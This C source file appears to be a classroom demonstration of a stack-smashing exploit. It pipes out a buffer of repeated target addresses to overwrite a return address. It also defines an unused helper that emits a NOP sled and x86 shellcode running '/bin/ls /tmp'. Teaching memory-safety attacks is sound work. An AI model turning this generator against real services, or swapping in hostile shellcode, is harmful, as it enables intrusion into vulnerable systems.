/**
 Demonstrate service vulnerability via stack smashing
*/
#include <stdio.h>
#include <stdlib.h>

/* Vulnerable machine's word size */
typedef unsigned int word;

int offset=0;
unsigned char xorby=0;
unsigned int bytesleft=0;
void emit(unsigned char x) {
	x=x^xorby; // fix outgoing xor at this stage
	//printf("\\x%02x",x); // for $'shellcode'
	putc(x,stdout); // for direct pipe
	bytesleft--;
	offset++;
}
void emit_word(word w) {
	emit(w); // little endian target
	emit(w>>8);
	emit(w>>16);
	emit(w>>24);
}
void emit_long(long w) {
	emit_word(w); // little endian target
	emit_word(w>>32);
}


// Emit simple command syscall as binary machine code
//    See disassembly with 
//      echo -n $'\x...' > a
//      ndisasm -b 32 a
void emit_shell(void) {
	// nop "sled" to allow some slop in jump target address
	for (int sled=0;sled<32;sled++) emit(0x90);

	const char *shell=
	// http://shell-storm.org/shellcode/files/shellcode-758.php
	"\x31\xc0"
	"\x50"
	"\x68" "//ls" // exe
	"\x68" "/bin" // dir
	"\x89\xe3"
	"\x50"
	"\x68" "/tmp"  // ls argument
	"\x89\xe1"
	"\x50"
	"\x51"
	"\x53"
	"\x89\xe1"
	"\xb0\x0b"
	"\xcd\x80";
	
	while (*shell!=0) emit(*shell++);
}

int main(int argc,char *argv[]) {
	long address=0;
	if (argc>1) sscanf(argv[1],"%li",&address);
	
	// Address of target function
	word target=(word)address;
	
	// Hose return address over everything!
	for (int brute=0;brute<256;brute++)
		emit_word(target); 
	
	// Finish up with newline
	emit('\n');
	
	return 0;
}


